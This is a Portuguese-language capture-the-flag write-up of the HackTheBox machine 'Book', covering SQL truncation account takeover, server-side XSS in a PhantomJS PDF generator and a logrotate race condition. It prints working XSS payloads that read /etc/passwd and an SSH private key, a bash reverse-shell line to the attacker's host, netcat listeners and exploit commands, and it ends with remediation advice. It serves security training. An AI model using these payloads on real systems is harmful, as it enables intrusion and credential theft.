---
title: 'HackTheBox - Book'
date: 2026-05-29
draft: "false"
description: 'Write-up completo de uma máquina medium do HackTheBox'
tags:
categories: '["CTF", "HackTheBox"]'
series: '["HackTheBox Medium"]'
ShowTableOfContents: "true"
showHero: true
heroStyle: "background"
---

## Informação da Máquina

| Property             | Value       |
| -------------------- | ----------- |
| **Plataform**        | HackTheBox  |
| **Difficult**        | Medium      |
| **Operation System** | Linux       |

## Sumário Executivo

Esse writeup documenta o comprometimento completo da máquina "Book" do HackTheBox, uma aplicação web hospedada em servidor Linux, cujo ambiente de testes é classificado como dificuldade média na plataforma.

A cadeia de comprometimento (KillChain) começa por meio de um SQL Truncation, uma vulnerabilidade no sistema de autenticação que explora o comportamento específico do banco de dados MySQL, documentado na documentação oficial do mesmo, a fim de promover um mecanismo de hijack (sequestro) da conta de administrador do sistema sem utilizar a senha original da conta.

Com o acesso a conta administrativa, é executado um ataque de Cross-Site Scripting (XSS) do lado do servidor (utilizando o browser de terminal PhantomJS como gerador de PDF) para exfiltrar a chave privada do acesso SSH armazenada dentro dos arquivos do sistema do servidor Linux que hospeda a aplicação. Essa chave é utilizada para acesso inicial ao servidor.

A escalada de privilégios do usuário local para o comprometimento total do servidor é realizada através da exploração de uma falha de configuração do logrotate, um utilitário Linux para rotação/limpeza de logs, que mal configurado permite uma condição de corrida via exploit conhecido. Esta condição de corrida nos permite privilégio de escrita num arquivo root, o que nos permite transformar um arquivo legítimo num vetor de comprometimento total.

Essa máquina nos permite treinar a cadeia de comprometimento, um dos conceitos centrais da segurança offensiva, que nos permite, por vezes, por meio se encadeamento de pequenas vulnerabilidades, avançar até o comprometimento total dos sistemas.

## Overview da cadeia de comprometimento

```
SQL Truncation → Admin Account Takeover
       ↓
Server-Side XSS (PhantomJS) → SSH Key Exfiltration
       ↓
SSH Access → reader@book
       ↓
Logrotate Race Condition → root
```

## Recon

Iniciamos a máquina com somente um IP.

Realizo um scan padrão com as top 1k portas mais comuns do Nmap, enquanto deixo em background um scan completo visando não deixar passar nada em alguma porta.

```
`sudo nmap -Pn -sS -sVC -T4 10.129.95.163 -oN nmap_book`
```

### Portas abertas

Apenas duas portas abertas encontradas na aplicação

|Port|Service|Notes|
|---|---|---|
|22|SSH|OpenSSH|
|80|HTTP|PHP web app|

Para nos precaver de problemas de DNS é interessante usar a edição do nosso arquivo /etc/hosts:

```
`sudo sed -i '$ a 10.129.95.163 book.htb' /etc/hosts`
```

### Enumeração do serviço Web

Acessando a porta 80 encontramos uma loja de livros online feita em PHP (confirmado via Wappalyzer).

Observação inicial relevante:
- O código fonte HTML tem uma mensagem interessante sobre limite de caracteres nos campos interativos da página - uma dica sobre o SQL Truncation no contexto do CTF.
- As informações de contato da página revelam o e-mail administrativo utilizado pela conta admin
- Após registrar uma conta, verificamos que existe um painel específico para uso dos usuários.
- Enumeração de diretório revela que existe uma área especificamente dedicada ao painel de administrador.

A enumeração de diretório foi realizada mediante o seguinte comando, via ferramenta ffuf (não é necessariamente a ferramenta mais adequada para isso, mas funciona tão bem quanto gobuster nesse contexto):

```
ffuf -u http://10.129.95.163/FUZZ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/trickest-robots-disallowed-wordlists/top-10000.txt
```
Essa enumeração devela o diretório /admin/.

## Acesso inicial - Foothold

**SQL Truncation - Sequestro de conta administradora

MySQL possui um comportamento detalhadamente esmiuçado na documentação oficial: quando uma string excende o número máximo de uma coluna, ela é truncada no INSERT. Combinado com o encode do espaço em branco no cadastro, permite que o atacante crie uma conta utilizando um e-mail que já existe vinculado a outra, permitindo que o atacante tome posse dessa última. Isso é feito utilizando caracteres de encode do espaço em branco em adição ao e-mail da vítima:

![img1](/img/Pasted_image_20260529014930.png)

A aplicação insere e grava a senha, permitindo que uma tentativa de autenticação com a senha escolhida pelo atacante junto ao e-mail da vítima, resolva como a conta alvo no banco de dados.

Após tentativa e erro, é fácil descobrir a quantidade exata de encodes do espaço em branco `+` são necessários para truncar e ganhar o acesso.

### Server-side XSS via PDF gen (PhantomJS)

Dentro do painel administrativo, uma sessão chamada **Collections** gera um PDF a partir de um input de usuário enviando um arquivo, supostamente, um livro. O renderizador de PDF é identificado usando um XSS que tenta se conectar ao nosso netcat e revela ser um PhantomJS, um browser sem interface gráfica, dedicado a uso em CLI, que executa o Java Script no servidor.

Verificamos que o input para o usuário pode ser acionado via HTML tag direcionando a nossa máquina com um tag `img`

Abrimos nosso NetCat:

```
nc -lvnp 80
```

Em seguida nos conectamos ao nosso NetCat:

```
<img src="http://<nosso_ip>/<arquivo_enviado_por_nós_na_aplicação>" />
```

Recebemos a tentativa de conexão que revela o PhantomJS sendo utilizado para renderização dos PDFs.

Nós confirmamos a execução do JS no servidor chamando com:

```
`<script>document.write("Javascript works!")</script>`
```

Isso significa que podemos fazer uso da API XmlHttpRequest  para ler arquivos locais do servidor.

Para mais detalhes a respeito:
https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest/Using_XMLHttpRequest

### Exfiltração de chave SSH

Inicialmente, tentamos ler o arquivo que contém informações dos usuários existentes e que, eventualmente em CTFs possui dicas emulando má configuração de ambiente: /etc/passwd

```html
<script>
x=new XMLHttpRequest;
x.onload=function(){document.write(this.responseText)};
x.open("GET","file:///etc/passwd");x.send();
</script>
```

O gerador de PDF nos retorna o conteúdo completo de /etc/passwd confirmando usuários válidos na máquina. Nos interessa o usuário reader (UID 1000, home no caminho /home/reader):

![img2](/img/Pasted_image_20260529020553.png).

Nos exfiltramos a chave SSH encodando ela em base64 para não quebrar a exibição no PDF, preservando o conteúdo.

```html
<script>
var x = new XMLHttpRequest();
x.open("GET", "file:///home/reader/.ssh/id_rsa", true);
x.onload = function(){
    var code = "<textarea rows='100' cols='70'>" + btoa(x.responseText) + "</textarea>";
    document.write(code);
};
x.send();
</script>
```

O PDF renderizado através do painel **Colections** de administração contém a chave privada codificada Base64. Depois de decodificá-lo e salvá-lo localmente:

```
ssh -i reader-owned-key.key reader@<ip_alvo>
```

Assim é obtido o acesso inicial da conta reader no servidor Linux.

## Escalada de Privilégios

Race condition, condição de corrida, no logrotate:

Com o acesso inicial como `reader`, identificamos uma má configuração no logrotate com a utilização do linpeas, script que enumera todos os vetores de escalada de privilégio em ambientes linux.

Com isso descobrimos que o usuário `reader`possui privilégio de escrita aos arquivos de log do sistema que periodicamente são limpados, alterados, pelo logrotate rodando como root.

O exploit `logrotten` foi pensado exatamente para explorar essa condição de corrida, trocando o arquivo original executado como root, por um conteúdo escrito como usuário já comprometido, num local privilegiado /etc/bash_completion.d/, assim no momento 'exato' que o logroten é executado, ele faz uso de um arquivo com conteúdo injetado de forma arbitrária pelo atacante.

A execução funciona assim:

```
git clone https://codeberg.org/whotwagner/logrotten.git
```

transferimos ao alvo abrindo um servidor web com python3 -m http.server 8000

e fazendo a requisição da máquina alvo para a nossa extraindo o logrotten:

```
wget http://<nosso_ip>:8000/logrotten
```

Em seguida, compilamos diretamente na maquina alvo:

```
gcc logrotten.c -o logrotten
```

O próximo passo é criar o payload do arquivo que será o shell reverso utilizado:

```
echo "bash -i >& /dev/tcp/<nosso_ip>/4445 0>&1" > shell.sh
```

preparamos o NetCat para receber o shell reverso:

```
nc -lnvp 4445
```

Executamos o exploit:

```
cp /home/reader/access.log.1 /home/reader/access.log; ./logrotten -d -p shell.sh /home/reader/backups/acess.log; cat /etc/bash_completion.d
```

Quando o logrotate executa (nesse caso rodava com novo login na máquina - bastando acessar novamente via ssh com outro shell), a condição de corrida é iniciada e o payload é devidamente escrito no caminho privilegiado do root. Quando isso ocorre, desencadeia a execução de um terminal root no nosso ouvinte NetCat.

Com isso, a máquiana é completamente comprometida.
## Lições Aprendidas

### SQL Truncation

O MySQL trunca silenciosamente strings que excedem o tamanho máximo definido para uma coluna. Combinado com validação de input insuficiente e ausência de verificação adequada de unicidade na camada de aplicação, isso permite que um atacante registre uma conta que colide com uma já existente — efetivamente sequestrando-a.

**Remediação:** Valide o tamanho do input na camada de aplicação antes de chegar ao banco de dados. Trate truncamentos a nível de banco como erros críticos, não como operações silenciosas.

---

### Server-Side XSS via Headless Browser

O PhantomJS e navegadores headless similares executam JavaScript em contexto de servidor, dando-lhes acesso ao sistema de arquivos local via `XMLHttpRequest` e o protocolo `file://`. Input controlado pelo usuário renderizado por esses engines deve ser tratado como execução de código, não apenas como markup.

**Remediação:** Nunca renderize input do usuário sem sanitização em engines de navegador headless. Implemente uma Content Security Policy restrita e sanitize todo input antes da geração de PDFs. Migre para longe do PhantomJS, que está sem manutenção desde 2018.

---

### LFI via XSS (SSXSS / Dynamic PDF)

A combinação de XSS armazenado + renderização de PDF server-side cria um primitivo poderoso de leitura de arquivos. Neste caso, `/etc/passwd` e chaves privadas SSH foram exfiltradas inteiramente através do navegador.

Referência: [HackTricks — Server-Side XSS Dynamic PDF](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html)

---

### Misconfiguration no Logrotate

O logrotate é um utilitário de sistema confiável, mas se torna perigoso quando:

- Um usuário de baixo privilégio tem permissão de escrita em um arquivo dentro de um caminho monitorado pelo logrotate
- O logrotate é executado com privilégios elevados (root)
- A diretiva `create` coloca novos arquivos em caminhos que afetam execução (ex.: `/etc/bash_completion.d/`)

**Remediação:** Restrinja as permissões de escrita em arquivos de log à conta de serviço que os gera. Faça auditoria nas configurações do logrotate buscando scripts `postrotate` e diretivas `create` que referenciem caminhos privilegiados.

---

### Metodologia

```
1. Reconhecimento        — Port scan, fingerprinting de tecnologias web, enumeração de diretórios
2. Enumeração            — Revisão de código-fonte, descoberta do e-mail do admin, análise de limites de campos
3. Acesso Inicial        — SQL Truncation para hijack do admin, SSXSS para leitura da chave SSH
4. Escalação de Privilégio — Race condition no logrotate via logrotten
5. Pós-exploração        — Shell root, flags capturadas
```

---

### Referências

- [PhantomJS — Site Oficial](https://phantomjs.org/)
- [MDN — XMLHttpRequest API](https://developer.mozilla.org/en-US/docs/Web/API/XMLHttpRequest_API/Using_XMLHttpRequest)
- [HackTricks — Server-Side XSS / Dynamic PDF](https://book.hacktricks.wiki/en/pentesting-web/xss-cross-site-scripting/server-side-xss-dynamic-pdf.html#load-an-external-script)
- [Exploit logrotten](https://codeberg.org/whotwagner/logrotten)
- [Comportamento de String Truncation no MySQL](https://dev.mysql.com/doc/refman/8.0/en/char.html)
